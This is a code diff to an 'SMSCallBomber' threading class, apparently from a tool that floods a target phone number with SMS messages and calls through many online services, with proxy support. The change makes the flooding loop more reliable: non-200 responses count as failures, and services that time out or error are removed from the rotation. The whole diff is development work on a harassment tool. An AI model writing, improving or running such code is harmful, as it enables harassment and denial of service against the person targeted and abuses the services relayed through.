@@ -56,20 +56,32 @@ class SMSCallBomber(threading.Thread):
             service = Service(service_info, self.args.phone, self.args.timeout, self.args.proxy)
             domain_name = service.get_domain_name()
             try:
-                service.send_request()
-                local_successful_count += 1
+                status_code = service.send_request()
+                if status_code == 200:
+                    local_successful_count += 1
+                else:
+                    self.services.remove(service_info)
+                    local_failed_count += 1
             except exceptions.ReadTimeout:
                 logging.info(f"Fail - {domain_name} - ReadTimeout")
                 local_failed_count += 1
+                if service_info in self.services:
+                    self.services.remove(service_info)
             except exceptions.ConnectTimeout:
                 logging.info(f"Fail - {domain_name} - ConnectTimeout")
                 local_failed_count += 1
+                if service_info in self.services:
+                    self.services.remove(service_info)
             except exceptions.ConnectionError:
                 logging.info(f"Fail - {domain_name} - ConnectionError")
                 local_failed_count += 1
+                if service_info in self.services:
+                    self.services.remove(service_info)
             except Exception as err:
                 logging.error(f"{err}")
                 local_failed_count += 1
+                if service_info in self.services:
+                    self.services.remove(service_info)
             except (KeyboardInterrupt, SystemExit):
                 exit()
 
